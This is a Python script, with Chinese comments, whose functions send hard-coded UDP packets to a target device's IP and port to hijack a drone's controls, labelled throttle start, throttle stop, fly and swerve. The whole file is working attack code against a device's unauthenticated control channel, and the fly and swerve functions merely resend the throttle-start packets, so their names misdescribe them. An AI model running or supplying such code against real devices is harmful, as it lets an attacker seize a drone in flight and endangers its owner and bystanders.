import socket
from time import sleep
def throttle_start_hijack(device_ip, port):
    # 定义目标 IP 和端口
    dst_ip = device_ip
    dst_port = port

    # 油门启动劫持命令
    data = bytes.fromhex(
        "ef0258000202000100000000d5000000140066148080b38000020000000000000000000031990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000"
    )
    data2 = bytes.fromhex(
        "ef0258000202000100000000d7000000140066148080ff800002000000000000000000007d990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000")

    # 创建原始套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 发送 油门启动 数据包
    def throttle_start():
        sock.sendto(data, (dst_ip, dst_port))
        sleep(0.3)
        sock.sendto(data2, (dst_ip, dst_port))

    throttle_start()
    # 关闭套接字
    sock.close()

    return f"Throttle start hijack performed on {device_ip}:{port} successfully."

def throttle_stop_hijack(device_ip, port):
    dst_ip = device_ip
    dst_port = port
    data_throttle_stop = bytes.fromhex(
        "ef0258000202000100000000fd000000140066148080008000020000000000000000000082990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    def throttle_stop():
        sock.sendto(data_throttle_stop, (dst_ip, dst_port))

    throttle_stop()
    sock.close()

    return f"Throttle stop hijack performed on {device_ip}:{port} successfully."


def fly_hijack(device_ip, port):
    # 定义目标 IP 和端口
    dst_ip = device_ip
    dst_port = port

    # 油门启动劫持命令
    data = bytes.fromhex(
        "ef0258000202000100000000d5000000140066148080b38000020000000000000000000031990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000"
    )
    data2 = bytes.fromhex(
        "ef0258000202000100000000d7000000140066148080ff800002000000000000000000007d990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000")

    # 创建原始套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 发送 油门启动 数据包
    def fly():
        sock.sendto(data, (dst_ip, dst_port))
        sleep(0.3)
        sock.sendto(data2, (dst_ip, dst_port))

    fly()
    # 关闭套接字
    sock.close()

    return f"Fly hijack performed on {device_ip}:{port} successfully."



def swerve_hijack(device_ip, port):
    # 定义目标 IP 和端口
    dst_ip = device_ip
    dst_port = port

    # 油门启动劫持命令
    data = bytes.fromhex(
        "ef0258000202000100000000d5000000140066148080b38000020000000000000000000031990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000"
    )
    data2 = bytes.fromhex(
        "ef0258000202000100000000d7000000140066148080ff800002000000000000000000007d990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000")

    # 创建原始套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 发送 油门启动 数据包
    def swerve():
        sock.sendto(data, (dst_ip, dst_port))
        sleep(0.3)
        sock.sendto(data2, (dst_ip, dst_port))

    swerve()
    # 关闭套接字
    sock.close()

    return f"Swerve hijack performed on {device_ip}:{port} successfully."